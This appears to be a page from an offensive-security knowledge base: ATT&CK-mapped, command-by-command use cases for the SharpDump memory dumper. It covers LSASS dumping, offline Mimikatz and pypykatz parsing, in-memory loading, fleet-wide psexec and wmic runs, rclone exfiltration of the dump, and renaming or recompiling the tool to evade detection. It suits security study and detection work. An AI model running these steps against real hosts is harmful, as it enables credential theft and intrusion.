# SharpDump — Hands-On Use Cases

Every command and behavior below is verified against [`GhostPack/SharpDump`](https://github.com/GhostPack/SharpDump)'s `README.md` and `Program.cs` source — none are inferred from memory.

## Contents
- [Baseline LSASS Dump](#baseline-lsass-dump)
- [Targeting an Arbitrary Process by PID](#targeting-an-arbitrary-process-by-pid)
- [Dumping a Non-LSASS Process Without Elevation](#dumping-a-non-lsass-process-without-elevation)
- [Chained Offline Extraction — SharpDump to Mimikatz](#chained-offline-extraction--sharpdump-to-mimikatz)
- [Chained Offline Extraction — SharpDump to pypykatz](#chained-offline-extraction--sharpdump-to-pypykatz)
- [In-Memory Execution via Cobalt Strike execute-assembly](#in-memory-execution-via-cobalt-strike-execute-assembly)
- [In-Memory Execution via PowerShell Reflection](#in-memory-execution-via-powershell-reflection)
- [Fleet-Wide Deployment via an Existing Remote-Execution Tool](#fleet-wide-deployment-via-an-existing-remote-execution-tool)
- [Exfiltrating the Compressed Dump](#exfiltrating-the-compressed-dump)
- [Renaming the Binary to Defeat Filename Matching](#renaming-the-binary-to-defeat-filename-matching)
- [Recompiling From Source to Change Fixed Behavior](#recompiling-from-source-to-change-fixed-behavior)
- [Sequential Multi-Process Dump Sweep](#sequential-multi-process-dump-sweep)

---

## Baseline LSASS Dump

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

```cmd
C:\Temp>SharpDump.exe
```

No arguments — SharpDump resolves the process named `lsass` itself (`Process.GetProcessesByName("lsass")[0]`), checks the caller is in a high-integrity/Administrator context (required for this specific branch — see `01`), then writes a full-memory dump to `C:\Windows\Temp\debug<PID>.out`, GZip-compresses it to `C:\Windows\Temp\debug<PID>.bin`, and deletes the raw `.out`. Console output on success (from the README's own example):

```
[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
[+] Dump successful!

[*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file
[*] Deleting C:\WINDOWS\Temp\debug808.out

[+] Dumping completed. Rename file to "debug808.gz" to decompress.

[*] Operating System : Windows 10 Enterprise N
[*] Architecture     : AMD64
[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
```

Operator must be a local administrator/high-integrity — this is the one path where SharpDump enforces that itself and refuses to run otherwise.

## Targeting an Arbitrary Process by PID

**MITRE ATT&CK:** [T1003](https://attack.mitre.org/techniques/T1003/) (OS Credential Dumping) — the specific sub-technique depends entirely on what the targeted process actually holds in memory; SharpDump itself is process-agnostic

```cmd
C:\Temp>SharpDump.exe 8700
```

SharpDump is a general-purpose process dumper, not an LSASS-only tool — passing any numeric PID dumps that process instead, using the identical `MiniDumpWithFullMemory` call and the same hardcoded `debug<PID>.out`/`.bin` output convention. Real-world targets beyond LSASS include browser processes (in-memory session tokens/saved credentials), a custom line-of-business application holding decrypted secrets, or a VPN/RDP client process caching plaintext or reversible credential material. The operator must resolve the PID beforehand:

```cmd
tasklist /svc | findstr notepad++
C:\Temp>SharpDump.exe 8700
```

## Dumping a Non-LSASS Process Without Elevation

**MITRE ATT&CK:** [T1003](https://attack.mitre.org/techniques/T1003/)

```cmd
C:\Temp>SharpDump.exe 4412
```

Because SharpDump's own `IsHighIntegrity()` gate only fires when `ProcessName == "lsass"` (per `01`'s How It Works), a non-elevated operator can run this exact command against any other PID with **zero self-imposed check in the way** — whether it actually succeeds depends solely on whether the caller's existing token already has sufficient access to that specific process (e.g., a same-user, non-elevated process running under the operator's own logon session). This is a real, source-verified gap between what SharpDump *checks for itself* and what Windows *actually enforces*: a non-admin operator targeting their own user-context process gets no internal warning or block at all, unlike the explicit refusal LSASS-targeting produces.

## Chained Offline Extraction — SharpDump to Mimikatz

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
C:\Temp>SharpDump.exe
:: transfer debug808.bin off the target, then on the analysis host:
ren debug808.bin debug808.gz
:: decompress debug808.gz to debug808.out with any gzip-capable tool
```

```
mimikatz # sekurlsa::minidump debug808.out
mimikatz # sekurlsa::logonPasswords full
```

This is the exact chain the tool's own console output points the operator toward — SharpDump's job ends at producing a portable, compressed dump file; Mimikatz's `sekurlsa::minidump` offline mode does the actual credential parsing. Full command reference: `../../Mimikatz/sekurlsa (Credential Dumping)/02 - Hands-On Use Cases.md` (not re-derived here). The Mimikatz build used for parsing must match the dumped host's OS/architecture — the reason SharpDump prints `Operating System`/`Architecture` on every default-path run.

## Chained Offline Extraction — SharpDump to pypykatz

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```bash
# after transferring and decompressing debug808.out to a Linux analysis host
pypykatz lsa minidump debug808.out
```

The Linux/cross-platform equivalent to the Mimikatz chain above — useful when the analysis/offline-cracking pipeline runs off Windows entirely, or when the operator's own tradecraft avoids running Mimikatz (a heavily-signatured binary) anywhere at all, even on infrastructure they control.

## In-Memory Execution via Cobalt Strike execute-assembly

**MITRE ATT&CK:** [T1620](https://attack.mitre.org/techniques/T1620/) (Reflective Code Loading), [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```
beacon> execute-assembly C:\Tools\SharpDump.exe
beacon> execute-assembly C:\Tools\SharpDump.exe 4412
```

Loads and runs the compiled SharpDump assembly inside a sacrificial/forked beacon process's memory — no `SharpDump.exe` ever lands on the target's disk. The dump file itself (`debug<PID>.out`/`.bin`) still gets written to `%SystemRoot%\Temp\` exactly as it would from a standalone run, since that behavior is inside the assembly's own code, unaffected by how the assembly was loaded.

## In-Memory Execution via PowerShell Reflection

**MITRE ATT&CK:** [T1620](https://attack.mitre.org/techniques/T1620/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (PowerShell)

```powershell
$bytes = [IO.File]::ReadAllBytes("C:\Tools\SharpDump.exe")
[Reflection.Assembly]::Load($bytes)
[SharpDump.Program]::Main(@())          # default LSASS dump
# or:
[SharpDump.Program]::Main(@("4412"))    # target PID 4412
```

Standard reflective-load pattern — `[SharpDump.Program]::Main()` matches the assembly's actual namespace/class (`namespace SharpDump { class Program { static void Main(string[] args) ... } }`, verified against source). PowerShell v5's usual protections apply to the loader script itself (AMSI, Script Block Logging Event 4104, Module Logging 4103 — see `../../LOLBins/powershell/` for the underlying logging-subsystem mechanics) but not to the loaded assembly's own execution, which runs as compiled managed code.

## Fleet-Wide Deployment via an Existing Remote-Execution Tool

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares)

SharpDump has no network client of its own — chaining onto an already-built remote-execution tool is the realistic way it gets used against more than one host, the same convergence story `../../ProcDump/02 - Hands-On Use Cases.md` documents for ProcDump/`comsvcs.dll`. Via Sysinternals PsExec (`../../PsExec/`):

```cmd
psexec.exe \\target -c SharpDump.exe
```

Or via WMI (`../../Impacket/wmiexec/`, `../../LOLBins/wmic/`), once the binary is already staged:

```cmd
wmic /node:target process call create "C:\Windows\Temp\SharpDump.exe"
```

## Exfiltrating the Compressed Dump

**MITRE ATT&CK:** [T1560](https://attack.mitre.org/techniques/T1560/) (Archive Collected Data), [T1567](https://attack.mitre.org/techniques/T1567/) (Exfiltration Over Web Service)

```cmd
rclone copy C:\Windows\Temp\debug808.bin remote:staging --config C:\Windows\Temp\rc.conf
```

The `.bin` file — already GZip-compressed by SharpDump itself, no separate archiving step needed — is the deliverable. See `../../Rclone/` for the full exfil-tool treatment; that page's `--obscure` finding (fixed-key, reversible "encryption") applies to any credentials used to authenticate the exfil leg here too.

## Renaming the Binary to Defeat Filename Matching

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities)

```cmd
copy SharpDump.exe svchelper.exe
svchelper.exe
```

The compiled binary's own filename is trivially operator-controlled and defeats any hunt matching on `SharpDump.exe` specifically. It does **not** change anything about the tool's internal behavior — the output still lands at the same hardcoded `debug<PID>.out`/`.bin` path regardless of what the launching binary is called, and unmodified PE `AssemblyTitle`/`AssemblyProduct` VERSIONINFO fields (both `"SharpDump"` in unmodified source) survive the rename untouched, the same pattern already established for `../../PsExec/` and `../../ProcDump/`.

## Recompiling From Source to Change Fixed Behavior

No dedicated MITRE mapping — a build-time customization step, not an execution technique in its own right (the same treatment Rubeus's `hash` utility command gets in `../../Rubeus/02 - Hands-On Use Cases.md`).

Because no official binaries are ever released (per `01`), an operator who wants to defeat the fixed output-path/filename signal, change the hardcoded `dumpType` constant, or alter the `AssemblyTitle`/`AssemblyProduct` PE metadata has exactly one option: edit `Program.cs` directly and rebuild with Visual Studio 2015 (.NET 3.5 target). This is a real, if nontrivial, evasion path — unlike ProcDump or `comsvcs.dll`, where the operator changes the output path with a different command-line argument on every run, SharpDump's fixed convention can only be broken at the source level, which is exactly why `05 - Detection and Hunting.md` ranks that path pattern as the strongest single signal on this page.

## Sequential Multi-Process Dump Sweep

**MITRE ATT&CK:** [T1003](https://attack.mitre.org/techniques/T1003/)

```cmd
for %P in (672 4412 5108) do SharpDump.exe %P
```

Running SharpDump repeatedly against several already-resolved PIDs on the same compromised host — building a small evidentiary set of `debug<PID>.bin` files (one per targeted process) in `%SystemRoot%\Temp\` before a single consolidated exfil pass, rather than dumping and exfiltrating one process at a time. Each invocation is independent and leaves its own complete artifact trail per `03`/`04` — a burst of several `debug*.out`/`debug*.bin` file-creation events in a tight window on the same host is itself a detectable pattern, developed in `05`.